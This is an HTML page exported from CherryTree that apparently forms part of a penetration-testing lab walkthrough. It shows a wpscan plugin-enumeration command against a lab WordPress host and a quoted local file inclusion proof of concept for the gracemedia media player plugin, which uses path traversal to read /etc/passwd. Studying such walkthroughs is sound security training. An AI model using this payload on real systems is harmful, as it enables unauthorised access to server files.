@@ -1,0 +1,8 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>4. Wpscan</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><a name="h2-1"></a><strong><h2>4. Wpscan</h2></strong><br /><br />Use wpscan to find more about Wordpress<br /><br />With this command, we are telling the  wpscan to enumerate(-e) all themes(at), all plugins(ap) installed on the  wordpress site. And finally, all the users(u) that might be logged in  on the WordPress Site.<br /><br /><div class="codebox"><div class="codebox">$&nbsp;wpscan&nbsp;--url&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>192.168.12.29<span style="color:#ff9d00;font-weight:700">/</span>tsweb&nbsp;-e&nbsp;ap</div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/78-1.png" alt="images/78-1.png" /><br /><img src="images/78-2.png" alt="images/78-2.png" /><br /><br />We see all plugin target system and found a vulnerable “gracemedia player 1.0” plugin.<br /><br />Search the exploit at exploit-db and you'll find a local file inclusion.<br /><br /><img src="images/78-3.png" alt="images/78-3.png" /><br /><br />Click on the link and you'll see an explanation of the exploit.<br /><br />The important thing is:<br /><br /><code>Local File Inclusion POC:<br /><br />GET<br />/wordpress/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd<br /></code><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>
